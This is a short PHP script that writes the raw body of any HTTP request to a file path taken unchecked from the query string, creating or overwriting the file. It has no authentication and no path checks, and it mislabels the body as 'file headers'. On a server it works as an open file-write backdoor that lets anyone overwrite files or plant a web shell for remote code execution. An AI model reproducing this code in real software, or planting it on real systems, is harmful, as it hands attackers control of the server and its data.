<?php
$path = $_GET['path'];

if (!empty($path)) {
    $headers = file_get_contents('php://input');
    
    if ($headers !== false) {
        if (!file_exists($path)) {
            // Create a new file
            file_put_contents($path, $headers);
            echo "File created successfully.";
        } else {
            // Replace the existing file
            file_put_contents($path, $headers);
            echo "File replaced successfully.";
        }
    } else {
        echo "Error reading file headers.";
    }
} else {
    echo "Invalid path specified.";
}
?>